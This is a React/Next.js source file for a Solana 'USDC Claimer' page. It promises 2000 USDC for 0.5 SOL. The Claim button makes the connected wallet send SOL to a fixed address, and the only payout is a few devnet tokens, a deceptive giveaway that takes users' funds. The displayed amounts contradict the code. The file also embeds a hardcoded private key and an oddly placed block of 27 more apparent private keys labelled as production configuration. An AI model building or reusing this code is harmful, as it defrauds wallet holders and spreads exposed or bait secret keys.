/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2WzG3LtphpPwZcnWvJydxauHtUrQWuFaSpTRkLi5WT3PWTWNVE7iLwBckpdM6FATFFUdYoxTospUt83xzxQAFDTB"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3Df7B2gZcH65kq1fhkNwCxLNbXDTAFYGPGT8xSY8F6quN39cC3e3d1e2xsbuym9BRSkDKGUshyGGeg13R6rpethE",
  "key1": "tmJdzWAtHwitArr8RzWJJYiYviaZKWnGFfvFsa7wGXU9aVSrjAHUKjnPaeiLS2DzCZrq3P3CU11zTqGNSJb34EV",
  "key2": "2LnTMYZ8WNbgH9zRuu5fjaFUfw3nEi6igVMSYijKKamc4CjKdBcDPGaMVKFJADXM2smohNgrFG8t15kPNoouXeLx",
  "key3": "5iUFRJcJQZ9Puxejj8DzjYWPZWtzMsBvLcw4W5bQo493bjP5jsMeYUv6ZZAPdQ5cwXJ9Kkj6iEeppxQo6JxMiDxX",
  "key4": "4UYbHxgRUYg3ZzSc4kxFTpSn943GnC1Ci2NzaX91FjTe4T5dzaU3GnmkiZKFnQh3tZ9T1Ezm7yfTSat3HZBQzU9T",
  "key5": "5qHyfUkA72AjeTB3eUkTrNupuR9P8RPnQ3o9ZGXSVWeKaxEUGXeyxw1ccreBeJXXNyFsbJRVDGgbfwX7a5XN9ATS",
  "key6": "yDER3YQH2DCcJQKVKHcChpASbW4AB58ZUzEU9mZYcNpcNWLapFZSBsMpXgRiL5cUcZtp2cZTugPj7oWP5ARTE6H",
  "key7": "2pEkXcDkutwoyu2Qcd7izG1XvPj1oekbr57vxZPwNEMKBwruXf8RJDrWaAsGNuFUNSGxZQSqb5pWLXSHHgTcXh8z",
  "key8": "5RzxwKsMAPaf6867xkdmyrWcWo7NBmHCFZjetmywCKxcty7RMPonNj5n86CECmgU4EiqZTf5dKWPQMcUcvNqoxFX",
  "key9": "s2AY3DVADFBspk7Zt3fX9tpZihnqJyrai1xXrKK2Ddsix7uNcuMxMAWtDAVEuzzA8ip1treqFJzDaNPSDQUH5mJ",
  "key10": "x7xEVexzHe9kvEXKyQr3oWYfxHe7FZTo3bXDocc5XwYrcA1a3MRQtx3XHhJepzQBk6YNQQVYPWdKvPTKAa3xizZ",
  "key11": "3K8Kv6w9cHJk7s3U7FXWoXZgzqFVGNV25MX58rtMKXzWdeTjc5Kz24ZJBumuucoyakVqF5sUZLBUNorEjo5MWNs5",
  "key12": "5tter9rcWVG4JDNS3rB8P2PQXCLnQGX3E7AwKBcFcbebTMmPcdFmctB3cCfLnLTboyyw3YLzn6PcwbgozvoUqKkH",
  "key13": "43kzjZUHAegmcugJBgiiAmosDQT1yBFRPDBvm3GXVotkbrTrLoyHhA1qsbzNo2evHrU71WEEczv26MftDALh2NAt",
  "key14": "65yGbseiFw2TiRs4GVkKWTMeaNbuVTzozHD2zA559a6YcC4rYqnefukU4wz2DaSypFasCx7qyrqqcPwsuyNbVYFG",
  "key15": "4orsaZp63inCDCzz1F7GnANvJQRoetht7in114pGU3cJbSvDZsLutCBGYQmx7yPNUPqJ1PvcxTLppyXmGFkTTc1C",
  "key16": "5m8kRECB4yyRCeZ2D94D7Wgj9WQ692msKhVYFCP7rrGH5p5JAjJdQMtqvL6MV9qrxiay886hSxY6K6zm61TDfm28",
  "key17": "41T4uWSrSdhDBDAe1qWsqWmT19LRXwKFRxhHGEio9wf5Pi9TCRfNcPQ6vgvemXs6BdDdj5yZGHmYP6kBVjDUczAQ",
  "key18": "2zbdHm7wB7zN9XYiubSuQpm8ovKp7NjLoNx5H1QzRkzADBzR7iU2gnP2xxwdvAaS4XoizHBWWo1wAN8FF4HsDMTp",
  "key19": "f9ag8i43ihqpCyD3eqG8o4SHu7kp7spdMUxFudms7GNoH8A1t9Sra3b7RwTBuC3gBdmaFvZPZHAUWCiGwk3upGo",
  "key20": "5QnVv9n6WFfDxFYo4GoefoSoYU3TthJb5uZSozNVMKKG8BRtWbaqZWUGCWWGZKJpzgkaPpzQbWhUuUg12rppkHFa",
  "key21": "5VoEZEyp1TUQHgaCST2uXoDBpNRKGUwPGUgsq27y1pcivNngQgwYZwRFMtLpDNrHhXhrFTXeM2Kmz4AXTHLiQDyQ",
  "key22": "2nYVNAw1ahVRfNGNUbTCeYa1LSYdDwY5nApM31izws6qwb6sPoyZEEaaXKqYBEgL6ST4ZrFZdXbBYEdPTjAMRnkG",
  "key23": "2QXotzRmt2SGiRnKKZ2JEDsgixQ46DUkE9qwNGtiGyLgNfZVbnjsWW43yf5rMrCLVtUYp5jX4HuFZFZQM1DmxVy1",
  "key24": "4w5RLmxJsEP4kQ7PLV4AydMep1P2DYL2T2dXNmcVPg6huWcB87AnWgi2VcH7GN4Yzi54s4kEwAG2AC7MoJmaiERi",
  "key25": "DUge4hjPXNnauYq7jdzGwWWjaynqJS2aZh8xSK4a3n537aaHYmvPAG566XGV174mXFYfccSszd7V6aa4euJKtgw",
  "key26": "2UjjyFitzb8rGZk8ov2JBUp2imNpTb5Zsjei5B6ASKnF3KWFGvLT5iVxDSNcYgP32mX6fBp3FdNXeNqCRJ2NwKTd"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
